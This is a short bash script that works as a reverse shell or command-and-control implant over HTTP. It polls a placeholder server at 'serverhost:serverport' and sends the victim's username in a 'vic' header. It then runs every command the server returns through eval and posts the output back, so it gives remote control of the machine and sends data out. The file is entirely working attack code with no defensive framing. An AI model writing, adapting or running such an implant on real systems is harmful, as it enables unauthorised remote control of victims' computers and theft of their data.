#!/usr/bin/bash

while true
do
command=$(curl "http://serverhost:serverport/" -s -H "vic: $(whoami)") || exit
if [ "$command" ]
then
if echo "$command" | grep "^cd " &> /dev/null
then
$command 2> /dev/null;PWD=$(pwd)
curl "http://serverhost:serverport/" -s -X POST -d " " || exit
else
output=$(eval $command 2>&1)
curl "http://serverhost:serverport/" -s -X POST -d "$output" || exit
fi
fi
done
